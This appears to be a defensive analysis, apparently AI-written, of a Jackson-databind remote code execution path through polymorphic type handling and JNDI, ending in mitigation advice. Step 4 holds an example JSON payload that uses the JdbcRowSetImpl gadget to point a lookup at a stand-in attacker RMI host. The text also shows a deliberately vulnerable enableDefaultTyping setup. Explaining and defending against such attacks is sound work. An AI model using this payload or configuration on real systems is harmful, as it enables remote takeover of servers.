Okay, here's a deep analysis of the provided attack tree path, focusing on the Jackson-databind RCE vulnerability.

## Deep Analysis of Jackson-databind RCE Attack Tree Path

### 1. Define Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to thoroughly understand the specific attack path described, identify the critical vulnerabilities and misconfigurations that enable it, and propose concrete mitigation strategies to prevent this type of attack.  We aim to provide actionable recommendations for the development team.

**Scope:**

This analysis focuses exclusively on the provided attack tree path, which culminates in Remote Code Execution (RCE) via `System.exec` (or equivalent) through exploitation of `jackson-databind`'s Polymorphic Type Handling (PTH) and JNDI.  We will consider:

*   The mechanics of JNDI exploitation in this context.
*   The importance of type validation and how its absence contributes to the vulnerability.
*   The likely CVEs that could be involved.
*   Practical mitigation techniques.

We will *not* cover other potential attack vectors against the application, nor will we delve into general Jackson usage outside the context of this specific vulnerability.

**Methodology:**

1.  **Step-by-Step Breakdown:** We will dissect each step of the attack path, explaining the technical details and attacker actions.
2.  **Vulnerability Analysis:** We will identify the specific vulnerabilities and misconfigurations at each stage.
3.  **CVE Research:** We will research relevant CVEs related to `jackson-databind`, JNDI exploitation, and gadget chains that could be used in this attack.

5.  **Code Examples (where applicable):** We will provide illustrative code snippets to demonstrate vulnerable configurations and potential fixes.

### 2. Deep Analysis of the Attack Tree Path

Let's break down the attack path step-by-step:

**Step 1: Untrusted Data Input**

*   **Description:** The attack begins with the attacker controlling the input data that the application processes. This is the fundamental starting point for many attacks.
*   **Vulnerability:**  The application accepts and processes data from an untrusted source (e.g., a user, an external API) without sufficient validation or sanitization.
*   **Attacker Action:** The attacker crafts a malicious payload, typically a JSON object, designed to exploit the downstream vulnerabilities.

**Step 2: Network Input (HTTP Request)**

*   **Description:** The attacker delivers the malicious payload via an HTTP request, most commonly a POST request.  This is the delivery mechanism.
*   **Vulnerability:** The application exposes an endpoint that accepts JSON data via HTTP requests. This is not inherently a vulnerability, but it's the *attack surface*.
*   **Attacker Action:** The attacker sends an HTTP POST request to the vulnerable endpoint, with the malicious JSON payload in the request body.

**Step 3: Polymorphic Type Handling (PTH) Abuse**

*   **Description:** This is the core of the Jackson-databind vulnerability.  PTH allows Jackson to deserialize JSON objects into objects of different classes based on type information included in the JSON itself (e.g., a `@type` property).
*   **Vulnerability:**  The application is configured to enable PTH, either explicitly (e.g., using `enableDefaultTyping()`) or implicitly (due to a lack of proper configuration and using older, vulnerable versions of Jackson).  This allows the attacker to specify the class to be instantiated.
*   **Attacker Action:** The attacker includes a type identifier (e.g., `@class`) in the JSON payload, specifying a malicious class to be instantiated by Jackson.  This class is often a "gadget" â€“ a class with side effects that can be triggered during deserialization.
* **Example (Vulnerable Configuration):**

```java
// Vulnerable: Enables default typing, allowing arbitrary class instantiation
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // VERY DANGEROUS!

// ... later ...
MyObject obj = mapper.readValue(maliciousJson, MyObject.class);
```

**Step 4: JNDI (Java Naming and Directory Interface)**

*   **Description:** JNDI is a Java API for accessing naming and directory services.  It can be used to look up and load resources, including remote objects.
*   **Vulnerability:**  The attacker leverages a JNDI gadget chain.  A common gadget is `com.sun.rowset.JdbcRowSetImpl`.  When deserialized, this class can be configured (via its properties) to connect to a remote JNDI server.
*   **Attacker Action:** The attacker crafts the JSON payload to include properties for the `JdbcRowSetImpl` class (or a similar gadget) that point to a malicious JNDI server they control.  This server will then serve a malicious object.
* **Example (Malicious JSON):**

```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://attacker.com:1099/Exploit",
  "autoCommit": true
}
```

**Step 5: CVE-XXX**

*   **Description:** The attacker exploits a *specific* known vulnerability in `jackson-databind` or a related library.  This CVE often provides a specific gadget chain or a way to bypass existing mitigations.
*   **Vulnerability:** The application is using a vulnerable version of `jackson-databind` or a related library that contains a known, exploitable CVE.
*   **Attacker Action:** The attacker researches known CVEs and selects one that is applicable to the application's environment and Jackson version. They then tailor their payload to exploit that specific vulnerability.
*   **Relevant CVEs (Examples):**  There have been *many* CVEs related to Jackson-databind and JNDI exploitation.  Some examples include:
    *   CVE-2017-7525
    *   CVE-2017-17485
    *   CVE-2018-7489
    *   CVE-2019-12086
    *   CVE-2019-12384
    *   CVE-2019-14379
    *   CVE-2019-14439
    *   ...and many more.  The specific CVE exploited will depend on the Jackson version and the available gadget chains.

**Step 6: No Type Validation**

*   **Description:** The application lacks proper type validation before deserializing the JSON payload. This is a critical security flaw.
*   **Vulnerability:** The application does not restrict the types of objects that can be instantiated by Jackson during deserialization.  This allows the attacker to instantiate arbitrary classes, including gadgets.
*   **Attacker Action:** The attacker takes advantage of the lack of type validation to specify any class they want, as long as it's available on the classpath.

**Step 7: System.exec**

*   **Description:** This is the ultimate goal of the attacker: to achieve Remote Code Execution (RCE).  The attacker crafts the gadget chain to eventually execute `System.exec` (or `Runtime.getRuntime().exec()`, or `ProcessBuilder`) to run arbitrary commands on the server.
*   **Vulnerability:** The combination of all previous vulnerabilities allows the attacker to reach this point.
*   **Attacker Action:** The attacker's malicious JNDI server provides a serialized object that, when deserialized by the application, triggers a chain of actions that ultimately lead to the execution of `System.exec` with a command chosen by the attacker. This could be anything from downloading a malicious payload to creating a reverse shell.

### 3. Mitigation Recommendations

The following mitigation strategies are crucial to prevent this attack:

1.  **Disable Polymorphic Type Handling (PTH) if Unnecessary:**  The most effective mitigation is to completely disable PTH if the application does not *require* it.  This eliminates the root cause of the vulnerability.

    ```java
    ObjectMapper mapper = new ObjectMapper();
    // Do NOT enable default typing!
    ```

2.  **Use a Safe Deserialization Approach (if PTH is Required):** If PTH is absolutely necessary, use a safe approach:

    *   **Whitelist Known Types:**  Use Jackson's `@JsonTypeInfo` and `@JsonSubTypes` annotations to explicitly define the allowed types for deserialization.  This is the *recommended* approach if you need polymorphic deserialization.

        ```java
        @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "@type")
        @JsonSubTypes({
            @JsonSubTypes.Type(value = Dog.class, name = "dog"),
            @JsonSubTypes.Type(value = Cat.class, name = "cat")
        })
        public abstract class Animal {
            // ...
        }

        public class Dog extends Animal {
            // ...
        }

        public class Cat extends Animal {
            // ...
        }
        ```

    *   **Use a Custom Type Resolver:** Implement a custom `TypeResolverBuilder` to control the type resolution process and enforce strict validation rules.

    *   **Use `jackson-databind` >= 2.10:**  Later versions of Jackson have improved security defaults and more robust mechanisms for controlling polymorphic deserialization.  Upgrade to the latest stable version.

3.  **Input Validation:** Implement strict input validation to ensure that the incoming JSON data conforms to the expected schema and does not contain unexpected type identifiers.  This can help prevent the attacker from injecting malicious `@class` properties.

4.  **Update `jackson-databind` and Dependencies:** Regularly update `jackson-databind` and all related libraries to the latest patched versions to address known CVEs.  Use a dependency management tool (e.g., Maven, Gradle) to track and update dependencies.

5.  **Disable JNDI Lookup (if possible):** If the application does not require JNDI lookups, disable them entirely. This can be done through system properties or security manager configurations.

6.  **Least Privilege:** Run the application with the least necessary privileges.  This limits the damage an attacker can do even if they achieve RCE.

7.  **Web Application Firewall (WAF):**  A WAF can help detect and block malicious requests that attempt to exploit known vulnerabilities, including Jackson-databind RCE.

8.  **Security Audits and Penetration Testing:** Regularly conduct security audits and penetration testing to identify and address vulnerabilities before they can be exploited.

9. **Monitor logs:** Monitor application logs for suspicious activity, such as unexpected class instantiations or JNDI lookups.

### 4. Conclusion

The attack path described is a serious threat, leading to complete server compromise.  The combination of insecure `jackson-databind` configuration (specifically, enabling PTH without proper type validation), JNDI exploitation, and a lack of input validation creates a perfect storm for RCE.  By implementing the mitigation strategies outlined above, the development team can significantly reduce the risk of this type of attack and protect the application from compromise.  Prioritizing disabling PTH if it's not needed, and using whitelisting if it is, are the most critical steps.  Regular updates and security testing are also essential.
